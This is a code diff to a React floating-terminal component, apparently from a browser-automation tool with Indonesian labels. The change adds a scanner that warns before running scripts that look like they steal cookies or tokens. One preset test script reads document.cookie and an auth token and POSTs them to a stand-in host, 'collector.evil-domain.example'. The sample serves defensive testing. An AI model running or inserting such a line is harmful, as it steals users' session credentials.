@@ -8,8 +8,11 @@ import {
   Move,
   Globe,
   ClipboardPaste,
+  AlertTriangle,
+  ShieldCheck,
 } from 'lucide-react';
 import { ProxyConfig, ProxyProtocol, TerminalEntry } from '../types/browser';
+import { analyzeTerminalScriptRisk, ScriptRiskAnalysis } from '../utils/urlSecurity';
 
 interface FloatingTerminalProps {
   open: boolean;
@@ -38,6 +41,11 @@ const PRESET_SCRIPTS = [
     name: 'Inspeksi Provider EIP-6963',
     code: `console.log("Provider Web3 terdeteksi: MetaMask, Rabby Wallet, Phantom (Isolated CRX World)");`,
   },
+  {
+    name: 'Uji Skrip Berisiko (Scanner)',
+    code: `// Simulasi skrip berbahaya pencuri cookie & token\nconst loot = document.cookie + '|' + localStorage.getItem('auth_token');\nfetch('https://collector.evil-domain.example/steal', { method: 'POST', body: loot });`,
+    isRiskTest: true,
+  },
 ];
 
 export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
@@ -57,6 +65,12 @@ export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
   const [cmdInput, setCmdInput] = useState('');
   const [scriptText, setScriptText] = useState(PRESET_SCRIPTS[0].code);
   const [showScriptEditor, setShowScriptEditor] = useState(false);
+  const [pendingRisk, setPendingRisk] = useState<{
+    mode: 'command' | 'script';
+    label: string;
+    code: string;
+    analysis: ScriptRiskAnalysis;
+  } | null>(null);
 
   const [pos, setPos] = useState({ x: 16, y: 54 });
   const [size, setSize] = useState({ w: 410, h: 270 });
@@ -113,11 +127,39 @@ export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
     });
   };
 
+  const requestRunScriptWithScan = (scriptName: string, code: string) => {
+    const analysis = analyzeTerminalScriptRisk(code);
+    if (analysis.isHighRisk) {
+      setPendingRisk({ mode: 'script', label: scriptName, code, analysis });
+      return;
+    }
+    onRunScript(scriptName, code);
+    setShowScriptEditor(false);
+  };
+
   const handleSubmitCmd = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!cmdInput.trim()) return;
-    onRunCommand(cmdInput.trim());
+    const trimmed = cmdInput.trim();
+    if (!trimmed) return;
+    const analysis = analyzeTerminalScriptRisk(trimmed);
+    if (analysis.isHighRisk) {
+      setPendingRisk({ mode: 'command', label: 'Perintah Console', code: trimmed, analysis });
+      return;
+    }
+    onRunCommand(trimmed);
     setCmdInput('');
+  };
+
+  const handleConfirmPendingRisk = () => {
+    if (!pendingRisk) return;
+    if (pendingRisk.mode === 'command') {
+      onRunCommand(pendingRisk.code);
+      setCmdInput('');
+    } else {
+      onRunScript(pendingRisk.label, pendingRisk.code);
+      setShowScriptEditor(false);
+    }
+    setPendingRisk(null);
   };
 
   const handleApplyProxyForm = (e: React.FormEvent) => {
@@ -234,8 +276,12 @@ export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
               <button
                 key={preset.name}
                 type="button"
-                onClick={() => onRunScript(preset.name, preset.code)}
-                className="rounded border border-[#34312C] bg-[#22201D] px-2 py-0.5 text-[#C7C1B6] hover:border-[#D97757]/60 hover:text-white whitespace-nowrap shrink-0 cursor-pointer"
+                onClick={() => requestRunScriptWithScan(preset.name, preset.code)}
+                className={`rounded border px-2 py-0.5 whitespace-nowrap shrink-0 cursor-pointer ${
+                  preset.isRiskTest
+                    ? 'border-[#EAB308]/50 bg-[#EAB308]/15 text-[#FDE047] hover:bg-[#EAB308]/25'
+                    : 'border-[#34312C] bg-[#22201D] text-[#C7C1B6] hover:border-[#D97757]/60 hover:text-white'
+                }`}
               >
                 {preset.name}
               </button>
@@ -252,13 +298,13 @@ export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
                 className="thin-scrollbar flex-1 resize-none rounded-lg border border-[#35322C] bg-[#121110] p-2 font-mono text-[11px] leading-relaxed text-[#EDE8DE] outline-none focus:border-[#D97757]"
               />
               <div className="flex items-center justify-between text-[11px]">
-                <span className="text-[#9E988E]">Target: CDP Runtime.evaluate (Tab Aktif)</span>
+                <span className="flex items-center gap-1 text-[#9E988E]">
+                  <ShieldCheck className="h-3 w-3 text-[#86CFA0]" />
+                  <span>Pemindai Skrip Berbahaya Aktif</span>
+                </span>
                 <button
                   type="button"
-                  onClick={() => {
-                    onRunScript('Skrip Kustom', scriptText);
-                    setShowScriptEditor(false);
-                  }}
+                  onClick={() => requestRunScriptWithScan('Skrip Kustom', scriptText)}
                   className="flex items-center gap-1 rounded-md bg-[#D97757] px-3 py-1 font-medium text-[#181715] hover:bg-[#E58A6C] cursor-pointer"
                 >
                   <Play className="h-3 w-3" />
@@ -397,6 +443,59 @@ export const FloatingTerminal: React.FC<FloatingTerminalProps> = ({
             </button>
           </div>
         </form>
+      )}
+
+      {/* Pre-Run Malicious Script Scanner Yellow Warning Dialog */}
+      {pendingRisk && (
+        <div
+          role="alertdialog"
+          aria-modal="true"
+          aria-label="Peringatan Skrip Berisiko"
+          className="absolute inset-0 z-20 flex items-center justify-center bg-black/75 p-3 backdrop-blur-[2px]"
+        >
+          <div className="w-full max-w-[360px] rounded-xl border-2 border-[#EAB308] bg-[#231F12] p-3.5 text-[#FEF9C3] shadow-2xl space-y-2.5">
+            <div className="flex items-start gap-2">
+              <AlertTriangle className="mt-0.5 h-4 w-4 shrink-0 text-[#FACC15]" />
+              <div className="min-w-0">
+                <p className="text-xs font-bold text-[#FEF08A]">
+                  Peringatan Keamanan: Potensi Pencurian Cookie / Token
+                </p>
+                <p className="mt-1 text-[11px] leading-snug text-[#FEF9C3]/90">
+                  {pendingRisk.analysis.summary}
+                </p>
+              </div>
+            </div>
+
+            <div className="rounded-lg border border-[#EAB308]/35 bg-black/40 p-2 font-mono text-[10px] space-y-1 text-[#FDE68A]">
+              <div>
+                <span className="text-[#D4CEC3]">Akses Data: </span>
+                <span>{pendingRisk.analysis.matchedSources.join(', ')}</span>
+              </div>
+              <div>
+                <span className="text-[#D4CEC3]">Kirim Keluar: </span>
+                <span>{pendingRisk.analysis.matchedSinks.join(', ')}</span>
+              </div>
+            </div>
+
+            <div className="flex items-center justify-end gap-2 pt-0.5">
+              <button
+                type="button"
+                onClick={handleConfirmPendingRisk}
+                className="rounded-lg border border-[#EAB308]/45 px-2.5 py-1.5 text-[11px] font-medium text-[#FDE68A] hover:bg-[#EAB308]/15 cursor-pointer"
+              >
+                Tetap Jalankan
+              </button>
+              <button
+                type="button"
+                autoFocus
+                onClick={() => setPendingRisk(null)}
+                className="rounded-lg bg-[#FACC15] px-3.5 py-1.5 text-[11px] font-bold text-[#1C1917] hover:bg-[#FDE047] cursor-pointer"
+              >
+                Batal (Aman)
+              </button>
+            </div>
+          </div>
+        </div>
       )}
 
       {!docked && (
